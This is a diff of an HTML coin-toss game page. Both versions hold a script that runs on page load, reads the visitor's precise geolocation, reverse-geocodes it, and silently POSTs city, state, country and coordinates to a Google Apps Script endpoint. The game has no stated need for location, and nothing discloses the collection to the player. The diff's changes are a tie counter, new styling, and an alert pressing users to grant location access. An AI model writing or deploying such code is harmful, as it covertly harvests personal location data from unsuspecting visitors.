@@ -1,20 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-X02TNXZZSE"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-X02TNXZZSE');
-</script>
   <meta charset="UTF-8">
-  <title>Coin Toss Game</title>
+  <title>Coin Toss Game with Tie + Location</title>
   <style>
-    body { background: black; color: white; text-align: center; font-family: Arial; }
-    button { padding: 10px 20px; margin: 10px; font-size: 18px; border-radius: 10px; }
+    body { background: #111; color: #fff; text-align: center; font-family: Arial; margin-top: 100px; }
+    button { padding: 12px 24px; margin: 15px; font-size: 20px; border-radius: 10px; background: #222; color: #fff; border: 2px solid #fff; }
+    #result, #score { margin-top: 20px; font-size: 22px; }
   </style>
 </head>
 <body>
@@ -24,58 +16,70 @@
 <button onclick="playGame('tails')">Tails</button>
 
 <p id="result"></p>
-<p id="score">Wins: 0 | Losses: 0</p>
+<p id="score">Wins: 0 | Losses: 0 | Ties: 0</p>
 
 <script>
-  let wins = 0, losses = 0;
+  let wins = 0, losses = 0, ties = 0;
+  let lastResult = null;
 
   function playGame(guess) {
     const result = Math.random() < 0.5 ? 'heads' : 'tails';
-    if (guess === result) {
+
+    if (lastResult !== null && result === lastResult && guess === result) {
+      ties++;
+      document.getElementById('result').innerText = `Coin showed ${result} twice in a row. It's a Tie!`;
+    }
+    else if (guess === result) {
       wins++;
       document.getElementById('result').innerText = `You chose ${guess}. Coin is ${result}. You Win!`;
     } else {
       losses++;
       document.getElementById('result').innerText = `You chose ${guess}. Coin is ${result}. You Lose!`;
     }
-    document.getElementById('score').innerText = `Wins: ${wins} | Losses: ${losses}`;
+
+    lastResult = result;
+    document.getElementById('score').innerText = `Wins: ${wins} | Losses: ${losses} | Ties: ${ties}`;
   }
 
-  // Collect Location and Send to Google Sheets
+  // Location Tracker + Send to Google Sheet
   function getLocationAndSend() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(function(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
 
-        // Reverse Geocode to get City, State, Country
+        // Reverse Geocode (Get City, State, Country)
         fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`)
         .then(response => response.json())
         .then(locationData => {
             const data = {
-                city: locationData.address.city || locationData.address.town || locationData.address.village || "",
-                state: locationData.address.state || "",
-                country: locationData.address.country || "",
+                city: locationData.address.city || locationData.address.town || locationData.address.village || "Unknown",
+                state: locationData.address.state || "Unknown",
+                country: locationData.address.country || "Unknown",
                 latitude: latitude,
                 longitude: longitude
             };
 
-            // Send data to Google Sheets via Apps Script Web App
-            fetch('https://script.google.com/macros/s/AKfycbwVKRRasBcFOBDbqGTlRehOyepmnfLPJZmamoWh8TaNOFNnbunFWZDNjl8fvNyb3RB3zw/exec', { // Replace this
+            // Send to Google Apps Script Web App
+            fetch('https://script.google.com/macros/s/AKfycbwBW6x5rfQBiJr9P740bAnZDxGz2W20QRGfAg0bgZAH31nDg6dQvZrvF4iP6UAqh3s-/exec', { // Replace this!
                 method: "POST",
                 body: JSON.stringify(data),
                 headers: { "Content-Type": "application/json" }
             })
-            .then(response => console.log("Location data sent successfully!"))
+            .then(response => console.log("Location sent successfully!"))
             .catch(err => console.error("Error sending location:", err));
         });
+      },
+      function(error) {
+        console.error("Location Error:", error);
+        alert("Please allow location access in browser settings.");
       });
     } else {
-      alert("Geolocation is not supported by this browser.");
+      alert("Geolocation is not supported by your browser.");
     }
   }
 
-  // Trigger location sending on page load
+  // Run on Page Load
   window.onload = getLocationAndSend;
 </script>
 
